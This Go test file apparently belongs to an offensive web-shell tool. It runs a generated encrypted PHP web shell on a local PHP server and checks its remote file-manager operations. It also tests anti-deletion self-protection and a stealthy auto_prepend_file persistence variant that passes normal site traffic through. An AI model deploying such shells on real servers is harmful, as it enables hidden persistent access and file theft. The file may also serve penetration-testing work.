package scanner

import (
	"bytes"
	"context"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

// TestShellV2PHPFileManagerRuntime exercises the file-manager op against a real
// `php -S` process: directory listing, chunked read/write, mkdir/rename/delete,
// chmod and self-protection. It proves the deployed payload, not a Go mock.
func TestShellV2PHPFileManagerRuntime(t *testing.T) {
	php, err := exec.LookPath("php")
	if err != nil {
		t.Skip("php CLI not installed")
	}
	if testing.Short() {
		t.Skip("skipping runtime shell test in -short mode")
	}
	key, err := GenerateShellKey()
	if err != nil {
		t.Fatal(err)
	}
	carrier, err := GenerateShellCarrier()
	if err != nil {
		t.Fatal(err)
	}
	payload, err := BuildShellPayloadV2("php", key, carrier)
	if err != nil {
		t.Fatal(err)
	}

	dir := t.TempDir()
	shellPath := filepath.Join(dir, "shell.php")
	if err := os.WriteFile(shellPath, []byte(payload.Content), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "hello.txt"), []byte("hello jingwei"), 0o644); err != nil {
		t.Fatal(err)
	}
	sub := filepath.Join(dir, "sub")
	if err := os.Mkdir(sub, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(sub, "nested.bin"), []byte{0x00, 0x01, 0xfe, 0xff, 'J', 'W'}, 0o600); err != nil {
		t.Fatal(err)
	}
	large := make([]byte, 600<<10)
	for i := range large {
		large[i] = byte(i % 251)
	}
	largePath := filepath.Join(sub, "large.bin")
	if err := os.WriteFile(largePath, large, 0o600); err != nil {
		t.Fatal(err)
	}

	addr := startPHPServer(t, php, dir)

	url := fmt.Sprintf("http://%s/shell.php", addr)
	client := NewDeepClient(10 * time.Second)
	ctx := context.Background()
	if alive, note := CheckShellAlive(ctx, client, url, payload); !alive {
		t.Fatalf("alive check failed: %s", note)
	}

	list, err := ListShellFiles(ctx, client, url, payload, dir)
	if err != nil {
		t.Fatalf("list: %v", err)
	}
	if list.Path != dir {
		t.Fatalf("list path = %q, want %q", list.Path, dir)
	}
	byName := map[string]ShellFileEntry{}
	for _, e := range list.Entries {
		byName[e.Name] = e
	}
	for _, name := range []string{"shell.php", "hello.txt", "sub"} {
		if _, ok := byName[name]; !ok {
			t.Fatalf("list missing %s: %+v", name, list.Entries)
		}
	}
	if byName["hello.txt"].Type != "file" || byName["hello.txt"].Size != int64(len("hello jingwei")) {
		t.Fatalf("hello.txt entry = %+v", byName["hello.txt"])
	}
	if byName["sub"].Type != "dir" || byName["hello.txt"].Mode == "-" {
		t.Fatalf("unexpected entry metadata: %+v", byName)
	}
	if byName["hello.txt"].Modified <= 0 {
		t.Fatalf("missing mtime: %+v", byName["hello.txt"])
	}

	chunk, err := ReadShellFile(ctx, client, url, payload, filepath.Join(dir, "hello.txt"), 0, 1024)
	if err != nil {
		t.Fatalf("read: %v", err)
	}
	if string(chunk.Data) != "hello jingwei" || !chunk.EOF || chunk.Size != int64(len("hello jingwei")) {
		t.Fatalf("read chunk = %+v data=%q", chunk, chunk.Data)
	}

	first, err := ReadShellFile(ctx, client, url, payload, largePath, 0, 256<<10)
	if err != nil {
		t.Fatalf("read large head: %v", err)
	}
	if len(first.Data) != 256<<10 || first.EOF {
		t.Fatalf("large head len=%d eof=%v", len(first.Data), first.EOF)
	}
	second, err := ReadShellFile(ctx, client, url, payload, largePath, int64(len(first.Data)), 256<<10)
	if err != nil {
		t.Fatalf("read large middle: %v", err)
	}
	if len(second.Data) != 256<<10 || second.EOF {
		t.Fatalf("large middle offset=%d size=%d len=%d eof=%v", second.Offset, second.Size, len(second.Data), second.EOF)
	}
	tailOffset := first.Offset + int64(len(first.Data)) + int64(len(second.Data))
	third, err := ReadShellFile(ctx, client, url, payload, largePath, tailOffset, 256<<10)
	if err != nil {
		t.Fatalf("read large tail: %v", err)
	}
	if !third.EOF || len(third.Data) != len(large)-int(tailOffset) {
		t.Fatalf("large tail offset=%d size=%d len=%d eof=%v", third.Offset, third.Size, len(third.Data), third.EOF)
	}
	got := append(append(append([]byte{}, first.Data...), second.Data...), third.Data...)
	if !bytes.Equal(got, large) {
		t.Fatal("chunked read did not reproduce the large file")
	}

	newFile := filepath.Join(dir, "written.bin")
	if _, err := WriteShellFile(ctx, client, url, payload, newFile, 0, true, []byte("part1")); err != nil {
		t.Fatalf("write head: %v", err)
	}
	binary := []byte{0x00, 0x10, 0xff, 'X'}
	if _, err := WriteShellFile(ctx, client, url, payload, newFile, int64(len("part1")), false, binary); err != nil {
		t.Fatalf("write tail: %v", err)
	}
	onDisk, err := os.ReadFile(newFile)
	if err != nil {
		t.Fatal(err)
	}
	if !bytes.Equal(onDisk, append([]byte("part1"), binary...)) {
		t.Fatalf("written file = %q", onDisk)
	}

	if err := MkdirShellPath(ctx, client, url, payload, filepath.Join(dir, "newdir", "child")); err != nil {
		t.Fatalf("mkdir: %v", err)
	}
	moved := filepath.Join(dir, "newdir", "child", "written.bin")
	if err := RenameShellPath(ctx, client, url, payload, newFile, moved); err != nil {
		t.Fatalf("rename: %v", err)
	}
	if _, err := os.Stat(moved); err != nil {
		t.Fatalf("renamed file missing: %v", err)
	}
	if err := ChmodShellPath(ctx, client, url, payload, moved, "0600"); err != nil {
		t.Fatalf("chmod: %v", err)
	}
	if info, err := os.Stat(moved); err != nil || info.Mode().Perm() != 0o600 {
		t.Fatalf("chmod did not apply: %v mode=%v", err, info.Mode().Perm())
	}
	if err := DeleteShellPath(ctx, client, url, payload, filepath.Join(dir, "newdir"), true); err != nil {
		t.Fatalf("recursive delete: %v", err)
	}
	if _, err := os.Stat(filepath.Join(dir, "newdir")); !os.IsNotExist(err) {
		t.Fatalf("recursive delete left the directory: %v", err)
	}

	// The deployed shell file is protected from the file manager.
	if _, err := WriteShellFile(ctx, client, url, payload, shellPath, 0, true, []byte("broken")); err == nil ||
		!strings.Contains(err.Error(), "protected") {
		t.Fatalf("write shell file must be refused, got %v", err)
	}
	if err := DeleteShellPath(ctx, client, url, payload, shellPath, false); err == nil ||
		!strings.Contains(err.Error(), "protected") {
		t.Fatalf("delete shell file must be refused, got %v", err)
	}
	if source, err := os.ReadFile(shellPath); err != nil || string(source) != payload.Content {
		t.Fatalf("shell file changed after refused operations: %v", err)
	}

	if _, err := ReadShellFile(ctx, client, url, payload, filepath.Join(dir, "missing.txt"), 0, 128); err == nil {
		t.Fatal("reading a missing file must fail")
	}
}

// TestShellV2PHPPersistFileManagerRuntime proves the prepend variant keeps its
// pass-through behaviour while serving file-manager ops through the same
// encrypted channel.
func TestShellV2PHPPersistFileManagerRuntime(t *testing.T) {
	php, err := exec.LookPath("php")
	if err != nil {
		t.Skip("php CLI not installed")
	}
	if testing.Short() {
		t.Skip("skipping runtime shell test in -short mode")
	}
	key, err := GenerateShellKey()
	if err != nil {
		t.Fatal(err)
	}
	carrier, err := GenerateShellCarrier()
	if err != nil {
		t.Fatal(err)
	}
	payload, err := BuildPHPSemiPersistPayloadV2(key, carrier)
	if err != nil {
		t.Fatal(err)
	}
	dir := t.TempDir()
	prependPath := filepath.Join(dir, "prepend.php")
	if err := os.WriteFile(prependPath, []byte(payload.Content), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "index.php"), []byte(`<?php echo "site-ok";`), 0o644); err != nil {
		t.Fatal(err)
	}

	addr := startPHPServer(t, php, dir, "-d", "auto_prepend_file="+prependPath)

	url := fmt.Sprintf("http://%s/index.php", addr)
	client := NewDeepClient(10 * time.Second)
	ctx := context.Background()

	plain := client.Do(ctx, DeepRequest{Method: "GET", URL: url})
	if plain.Error != "" || plain.StatusCode != 200 || !strings.Contains(plain.Body, "site-ok") {
		t.Fatalf("prepend pass-through broken: status=%d err=%q body=%q", plain.StatusCode, plain.Error, plain.Body)
	}
	if alive, note := CheckShellAlive(ctx, client, url, payload); !alive {
		t.Fatalf("prepend alive check failed: %s", note)
	}
	list, err := ListShellFiles(ctx, client, url, payload, dir)
	if err != nil {
		t.Fatalf("prepend list: %v", err)
	}
	found := false
	for _, e := range list.Entries {
		if e.Name == "index.php" {
			found = true
		}
	}
	if !found {
		t.Fatalf("prepend list missing index.php: %+v", list.Entries)
	}
	if err := DeleteShellPath(ctx, client, url, payload, prependPath, false); err == nil ||
		!strings.Contains(err.Error(), "protected") {
		t.Fatalf("prepend file must be protected, got %v", err)
	}
	if _, err := os.Stat(prependPath); err != nil {
		t.Fatalf("prepend file disappeared: %v", err)
	}
	plain = client.Do(ctx, DeepRequest{Method: "GET", URL: url})
	if !strings.Contains(plain.Body, "site-ok") {
		t.Fatalf("pass-through broken after file ops: %q", plain.Body)
	}
}
